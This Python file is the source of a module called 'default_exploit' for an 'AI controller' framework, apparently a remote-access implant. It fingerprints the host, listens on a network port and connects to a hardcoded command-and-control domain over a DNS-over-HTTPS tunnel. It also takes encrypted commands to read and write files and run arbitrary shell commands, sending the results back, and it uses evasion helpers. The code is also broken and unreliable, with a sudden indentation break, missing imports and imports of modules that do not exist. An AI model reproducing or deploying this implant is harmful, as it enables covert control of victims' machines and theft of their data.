import logging
import random
import string
import time
import os
import base64
import json
import socket
import threading
import queue
import concurrent.futures
import hashlib
import secrets
import ipaddress
import platform
import psutil
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hmac
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, PrivateFormat
from cryptography.hazmat.primitives.keywrap import aes_key_wrap, aes_key_unwrap
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.keyagreement import x25519
from cryptography.hazmat.primitives.keyagreement import dh
from cryptography.hazmat.primitives.keyagreement import ec
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives.asymmetric import x448
from cryptography.hazmat.primitives.asymmetric import dsa
from src.utils.helpers import setup_logging, generate_timestamp, create_directory, list_files_in_directory, get_file_size, read_file_content, write_file_content
from src.modules.evasion.evasion import EvasionTechniques
from src.modules.doh.doh_tunnel import DoHTunnel

setup_logging()

MODULE_NAME = "default_exploit"

class Module:
    def __init__(self, ai_controller):
        self.ai_controller = ai_controller
        self.evasion = EvasionTechniques()
        self.doh = DoHTunnel()
        self.config = self.ai_controller.config
        self.log_dir = os.path.join(self.config.get("log_dir", "logs"), MODULE_NAME)
        create_directory(self.log_dir)
        self.running = True
        self.device_id = None
        self.session_key = None
        self.session_salt = None
        self.p2p_server_thread = None
        self.p2p_client_thread = None
        self.p2p_server_socket = None
        self.p2p_client_socket = None
        self.p2p_queue = queue.Queue()
        self.p2p_port = self.config.get("p2p_port", 5000)
        self.ddns_domain = self.config.get("ddns_domain", "zeroclickexploits.ddns.net")
        self.ddns_port = self.config.get("ddns_port", 443)
        self.defcon_thresholds = self.config.get("defcon_thresholds", {
            "critical": 1,
            "high": 2,
            "medium": 3,
            "low": 4
        })
        logging.info(f"Module '{MODULE_NAME}' initialized.")

    def _log(self, level, message):
        timestamp = generate_timestamp()
        log_file = os.path.join(self.log_dir, f"{self.device_id}_{timestamp}.log") if self.device_id else os.path.join(self.log_dir, f"{timestamp}.log")
        log_message = f"{timestamp} - {level.upper()} - {message}\n"
        write_file_content(log_file, log_message)
        if level == "error":
            self.ai_controller.log_event("module_error", message, self.device_id)
        logging.log(getattr(logging, level.upper()), f"[{MODULE_NAME}] {message}")

    def _generate_device_id(self):
        return str(uuid.uuid4())

    def _generate_random_key(self, length=32):
        return base64.urlsafe_b64encode(secrets.token_bytes(length)).decode('utf-8')

    def _generate_session_key(self, password):
        key, salt = self.ai_controller.generate_session_key(password)
        return key, salt

    def _verify_session_key(self, password, salt, key):
        return self.ai_controller.verify_session_key(password, salt, key)

    def _encrypt_data(self, data, key):
        return self.ai_controller.encrypt_data(data, key)

    def _decrypt_data(self, data, key):
        return self.ai_controller.decrypt_data(data, key)

    def _hash_data(self, data):
        return self.ai_controller.hash_data(data)

    def _sign_data(self, data):
        return self.ai_controller.sign_data(data)

    def _verify_signature(self, data, signature):
        return self.ai_controller.verify_signature(data, signature)

    def _generate_dh_keypair(self):
        return self.ai_controller.generate_dh_keypair()

    def _serialize_dh_public_key(self, public_key):
        return self.ai_controller.serialize_dh_public_key(public_key)

    def _deserialize_dh_public_key(self, public_key_pem):
        return self.ai_controller.deserialize_dh_public_key(public_key_pem)

    def _compute_dh_shared_key(self, private_key, peer_public_key):
        return self.ai_controller.compute_dh_shared_key(private_key, peer_public_key)

    def _generate_ec_keypair(self, curve=ec.SECP256R1()):
        return self.ai_controller.generate_ec_keypair(curve)

    def _serialize_ec_public_key(self, public_key):
        return self.ai_controller.serialize_ec_public_key(public_key)

    def _deserialize_ec_public_key(self, public_key_pem):
        return self.ai_controller.deserialize_ec_public_key(public_key_pem)

    def _compute_ec_shared_key(self, private_key, peer_public_key):
        return self.ai_controller.compute_ec_shared_key(private_key, peer_public_key)

    def _generate_x25519_keypair(self):
        return self.ai_controller.generate_x25519_keypair()

    def _serialize_x25519_public_key(self, public_key):
        return self.ai_controller.serialize_x25519_public_key(public_key)

    def _deserialize_x25519_public_key(self, public_key_bytes):
        return self.ai_controller.deserialize_x25519_public_key(public_key_bytes)

    def _compute_x25519_shared_key(self, private_key, peer_public_key):
        return self.ai_controller.compute_x25519_shared_key(private_key, peer_public_key)

    def _generate_x448_keypair(self):
        return self.ai_controller.generate_x448_keypair()

    def _serialize_x448_public_key(self, public_key):
        return self.ai_controller.serialize_x448_public_key(public_key)

    def _deserialize_x448_public_key(self, public_key_bytes):
        return self.ai_controller.deserialize_x448_public_key(public_key_bytes)

    def _compute_x448_shared_key(self, private_key, peer_public_key):
        return self.ai_controller.compute_x448_shared_key(private_key, peer_public_key)

    def _generate_ed25519_keypair(self):
        return self.ai_controller.generate_ed25519_keypair()

    def _serialize_ed25519_public_key(self, public_key):
        return self.ai_controller.serialize_ed25519_public_key(public_key)

    def _deserialize_ed25519_public_key(self, public_key_bytes):
        return self.ai_controller.deserialize_ed25519_public_key(public_key_bytes)

    def _sign_ed25519_data(self, data, private_key):
        return self.ai_controller.sign_ed25519_data(data, private_key)

    def _verify_ed25519_signature(self, data, signature, public_key):
        return self.ai_controller.verify_ed25519_signature(data, signature, public_key)

    def _generate_ed448_keypair(self):
        return self.ai_controller.generate_ed448_keypair()

    def _serialize_ed448_public_key(self, public_key):
        return self.ai_controller.serialize_ed448_public_key(public_key)

    def _deserialize_ed448_public_key(self, public_key_bytes):
        return self.ai_controller.deserialize_ed448_public_key(public_key_bytes)

    def _sign_ed448_data(self, data, private_key):
        return self.ai_controller.sign_ed448_data(data, private_key)

    def _verify_ed448_signature(self, data, signature, public_key):
        return self.ai_controller.verify_ed448_signature(data, signature, public_key)

    def _generate_dsa_keypair(self, key_size=2048):
        return self.ai_controller.generate_dsa_keypair(key_size)

    def _serialize_dsa_public_key(self, public_key):
        return self.ai_controller.serialize_dsa_public_key(public_key)

    def _deserialize_dsa_public_key(self, public_key_pem):
        return self.ai_controller.deserialize_dsa_public_key(public_key_pem)

    def _sign_dsa_data(self, data, private_key):
        return self.ai_controller.sign_dsa_data(data, private_key)

    def _verify_dsa_signature(self, data, signature, public_key):
        return self.ai_controller.verify_dsa_signature(data, signature, public_key)

    def _generate_aes_key(self, length=32):
        return self.ai_controller.generate_aes_key(length)

    def _aes_key_wrap_data(self, key, data):
        return self.ai_controller.aes_key_wrap_data(key, data)

    def _aes_key_unwrap_data(self, key, wrapped_data):
        return self.ai_controller.aes_key_unwrap_data(key, wrapped_data)

    def _generate_aes_gcm_key(self, length=32):
        return self.ai_controller.generate_aes_gcm_key(length)

    def _encrypt_aes_gcm_data(self, key, data):
        return self.ai_controller.encrypt_aes_gcm_data(key, data)

    def _decrypt_aes_gcm_data(self, key, encrypted_data):
        return self.ai_controller.decrypt_aes_gcm_data(key, encrypted_data)

    def _generate_hmac_key(self, length=32):
        return self.ai_controller.generate_hmac_key(length)

    def _hmac_data(self, key, data):
        return self.ai_controller.hmac_data(key, data)

    def _verify_hmac(self, key, data, hmac_signature):
        return self.ai_controller.verify_hmac(key, data, hmac_signature)
      def _resolve_domain(self, domain):
          return self.doh.resolve_ip(domain)

      def _generate_random_string(self, length=32):
          return self.evasion.generate_random_string(length)

      def _delay_execution(self, min_delay, max_delay):
          self.evasion.delay_execution(min_delay, max_delay)

      def _randomize_order(self, items):
          return self.evasion.randomize_order(items)

      def _split_string(self, text, chunk_size):
          return self.evasion.split_string(text, chunk_size)

      def _encode_string(self, text, encoding="base64"):
          return self.evasion.encode_string(text, encoding)

      def _start_p2p_server(self):
          self.p2p_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          self.p2p_server_socket.bind(('0.0.0.0', self.p2p_port))
          self.p2p_server_socket.listen(5)
          self._log("info", f"P2P server listening on port {self.p2p_port}")
          self.p2p_server_thread = threading.Thread(target=self._p2p_server_loop, daemon=True)
          self.p2p_server_thread.start()

      def _p2p_server_loop(self):
          while self.running:
              try:
                  conn, addr = self.p2p_server_socket.accept()
                  self._log("info", f"P2P connection from {addr}")
                  client_thread = threading.Thread(target=self._handle_p2p_client, args=(conn, addr), daemon=True)
                  client_thread.start()
              except socket.timeout:
                  pass
              except Exception as e:
                  self._log("error", f"P2P server error: {e}")
                  break

      def _handle_p2p_client(self, conn, addr):
          try:
              while self.running:
                  data = conn.recv(4096)
                  if not data:
                      break
                  self.p2p_queue.put((conn, data, addr))
                  self._log("debug", f"P2P data received from {addr}: {len(data)} bytes")
          except Exception as e:
              self._log("error", f"P2P client error: {e}")
          finally:
              conn.close()
              self._log("info", f"P2P connection closed with {addr}")

      def _start_p2p_client(self, target_ip):
          self.p2p_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          try:
              self.p2p_client_socket.connect((target_ip, self.p2p_port))
              self._log("info", f"P2P client connected to {target_ip}:{self.p2p_port}")
              self.p2p_client_thread = threading.Thread(target=self._p2p_client_loop, daemon=True)
              self.p2p_client_thread.start()
          except Exception as e:
              self._log("error", f"P2P client connection error: {e}")

      def _p2p_client_loop(self):
          while self.running:
              try:
                  conn, data, addr = self.p2p_queue.get(timeout=1)
                  if conn == self.p2p_client_socket:
                      self.p2p_client_socket.sendall(data)
                      self._log("debug", f"P2P client sent data: {len(data)} bytes")
              except queue.Empty:
                  pass
              except Exception as e:
                  self._log("error", f"P2P client loop error: {e}")
                  break

      def _send_p2p_data(self, data):
          if self.p2p_client_socket:
              try:
                  self.p2p_client_socket.sendall(data)
                  self._log("debug", f"P2P client sent data: {len(data)} bytes")
              except Exception as e:
                  self._log("error", f"P2P send data error: {e}")
          else:
              self._log("warning", "P2P client not connected.")

      def _process_p2p_data(self):
          while self.running:
              try:
                  conn, data, addr = self.p2p_queue.get(timeout=1)
                  if conn != self.p2p_client_socket:
                      self._log("debug", f"P2P data received from {addr}: {len(data)} bytes")
                      self._handle_received_data(data)
              except queue.Empty:
                  pass
              except Exception as e:
                  self._log("error", f"P2P data processing error: {e}")
                  break

      def _handle_received_data(self, data):
          try:
              decrypted_data = self._decrypt_data(data, self.session_key)
              if decrypted_data:
                  try:
                      message = json.loads(decrypted_data.decode('utf-8'))
                      self._log("debug", f"Received message: {message}")
                      self._process_message(message)
                  except json.JSONDecodeError:
                      self._log("warning", "Received invalid JSON data.")
              else:
                  self._log("warning", "Failed to decrypt received data.")
          except Exception as e:
              self._log("error", f"Error handling received data: {e}")

      def _process_message(self, message):
          message_type = message.get("type")
          if message_type == "ping":
              self._log("info", "Received ping message.")
              self._send_message({"type": "pong"})
          elif message_type == "command":
              command = message.get("command")
              args = message.get("args", [])
              self._log("info", f"Received command: {command} with args: {args}")
              self._execute_command(command, args)
          elif message_type == "update_defcon":
              defcon_level = message.get("defcon_level")
              self._log("info", f"Received DEFCON update request: {defcon_level}")
              self.ai_controller.adjust_defcon(defcon_level)
          else:
              self._log("warning", f"Received unknown message type: {message_type}")

      def _send_message(self, message):
          try:
              encrypted_message = self._encrypt_data(json.dumps(message).encode('utf-8'), self.session_key)
              self._send_p2p_data(encrypted_message)
              self._log("debug", f"Sent message: {message}")
          except Exception as e:
              self._log("error", f"Error sending message: {e}")

      def _execute_command(self, command, args):
          if command == "get_device_info":
              self._send_message({"type": "device_info", "data": self._get_device_info()})
          elif command == "list_files":
              dir_path = args[0] if args else "/"
              extensions = args[1] if len(args) > 1 else None
              files = list_files_in_directory(dir_path, extensions)
              self._send_message({"type": "file_list", "data": files})
          elif command == "read_file":
              file_path = args[0] if args else None
              if file_path:
                  content = read_file_content(file_path)
                  self._send_message({"type": "file_content", "data": content})
              else:
                  self._log("warning", "No file path provided for read_file command.")
          elif command == "write_file":
              file_path = args[0] if len(args) > 0 else None
              content = args[1] if len(args) > 1 else None
              if file_path and content:
                  success = write_file_content(file_path, content)
                  self._send_message({"type": "write_status", "data": success})
              else:
                  self._log("warning", "Invalid arguments for write_file command.")
          elif command == "get_file_size":
              file_path = args[0] if args else None
              if file_path:
                  file_size = get_file_size(file_path)
                  self._send_message({"type": "file_size", "data": file_size})
              else:
                  self._log("warning", "No file path provided for get_file_size command.")
          elif command == "execute_shell":
              shell_command = args[0] if args else None
              if shell_command:
                  try:
                      result = subprocess.run(shell_command, shell=True, capture_output=True, text=True, timeout=10)
                      self._send_message({"type": "shell_result", "data": {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}})
                  except subprocess.TimeoutExpired:
                      self._send_message({"type": "shell_result", "data": {"stdout": "", "stderr": "Command timed out", "returncode": 1}})
                  except Exception as e:
                      self._send_message({"type": "shell_result", "data": {"stdout": "", "stderr": str(e), "returncode": 1}})
              else:
                  self._log("warning", "No shell command provided for execute_shell command.")
          else:
              self._log("warning", f"Unknown command: {command}")

      def _get_device_info(self):
          return {
              "device_id": self.device_id,
              "os": platform.system(),
              "os_version": platform.release(),
              "architecture": platform.machine(),
              "hostname": socket.gethostname(),
              "ip_address": socket.gethostbyname(socket.gethostname()),
              "cpu_usage": psutil.cpu_percent(),
              "memory_usage": psutil.virtual_memory().percent,
              "disk_usage": psutil.disk_usage('/').percent,
              "network_usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
          }

      def _exploit(self):
          self._log("info", "Starting exploit sequence.")
          self.device_id = self._generate_device_id()
          self._log("info", f"Generated device ID: {self.device_id}")
          self.ai_controller.register_device(self.device_id, self._get_device_info())
          self.session_key, self.session_salt = self._generate_session_key(self._generate_random_string(32))
          self._log("info", f"Generated session key and salt.")
          self._start_p2p_server()
          self._log("info", "P2P server started.")
          self.ai_controller.submit_task(self._process_p2p_data)
          self._log("info", "P2P data processor started.")
          self._log("info", "Exploit sequence completed.")

      def handle_defcon(self, defcon_level):
          self._log("info", f"Handling DEFCON level: {defcon_level}")
          if defcon_level <= self.defcon_thresholds.get("critical", 1):
              self._log("warning", "Critical DEFCON level reached. Initiating emergency procedures.")
              self._send_message({"type": "emergency_shutdown"})
              self.shutdown()
          elif defcon_level <= self.defcon_thresholds.get("high", 2):
              self._log("warning", "High DEFCON level reached. Initiating enhanced security measures.")
              self._send_message({"type": "enhanced_security"})
          elif defcon_level <= self.defcon_thresholds.get("medium", 3):
              self._log("info", "Medium DEFCON level reached. Adjusting operational parameters.")
              self._send_message({"type": "adjust_operations"})
          else:
              self._log("info", "Low DEFCON level. Normal operations.")

      def run(self):
          self._exploit()
          target_ip = self._resolve_domain(self.ddns_domain)
          if target_ip:
              self._start_p2p_client(target_ip)
          else:
              self._log("error", f"Failed to resolve DDNS domain: {self.ddns_domain}")
          self._log("info", "Module is running.")

      def shutdown(self):
          self.running = False
          if self.p2p_server_socket:
              self.p2p_server_socket.close()
          if self.p2p_client_socket:
              self.p2p_client_socket.close()
          self.ai_controller.unregister_device(self.device_id)
          self._log("info", f"Module '{MODULE_NAME}' shutting down.")
